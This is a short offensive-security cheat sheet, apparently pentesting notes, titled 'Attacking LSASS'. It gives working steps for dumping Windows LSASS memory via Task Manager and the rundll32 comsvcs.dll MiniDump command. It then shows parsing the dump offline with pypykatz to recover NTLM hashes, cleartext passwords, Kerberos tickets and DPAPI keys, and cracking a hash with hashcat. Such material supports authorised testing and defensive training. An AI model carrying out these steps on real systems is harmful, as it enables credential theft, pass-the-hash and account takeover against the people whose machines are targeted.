# Attacking LSASS
```table-of-contents
```
## Method 1: Task Manager (GUI)
If we have RDP/GUI access as an Administrator:
1. Open **Task Manager**.
2. Go to the **Details** tab.
3. Right-click `lsass.exe`.
4. Select **Create dump file**.

File location: `C:\Users\<User>\AppData\Local\Temp\lsass.DMP`.
## Method 2: Rundll32 (CLI)
### Step 1: Find LSASS PID
**CMD:**
```powershell
tasklist /svc | findstr lsass
```
**PowerShell:**
```powershell
Get-Process lsass
# Look for the 'Id' column
```
### Step 2: Create Dump
```powershell
# Syntax: rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> <OutputFile> full
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
## Offline Extraction (Pypykatz)
Once you have transferred the `lsass.dmp` file to your attack box (using SMB, Netcat, etc.), use **pypykatz** to parse it. Pypykatz is a Python implementation of Mimikatz that works on Linux.
```shell
# Syntax: pypykatz lsa minidump <path_to_dmp_file>
pypykatz lsa minidump /home/user/lsass.dmp
```
### Understanding the Output
| **Section**  | **Content**         | **Utility**                                                                 |
| ------------ | ------------------- | --------------------------------------------------------------------------- |
| `MSV`      | NTLM Hashes         | Can be cracked (Hashcat) or used in Pass-the-Hash.                          |
| `WDIGEST`  | Cleartext Passwords | Older protocols. Often "null" on modern Windows (unless registry modified). |
| `Kerberos` | Tickets/Keys        | TGTs/TGSs for Pass-the-Ticket or Overpass-the-Hash.                         |
| `DPAPI`    | Master Keys         | Used to decrypt Chrome passwords, Outlook credentials, RDP saves.           |
### Example Output Analysis
```txt
== MSV ==
    Username: bob
    Domain: DESKTOP-33E7O54
    NT: 64f12cddaa88057e06a81b54e73b949b  <-- Crack this
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8

== WDIGEST ==
    username bob
    password (hex)                        <-- Often empty on Win10+
```
## Cracking Extracted Hashes
```shell
# Crack the extracted NT hash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```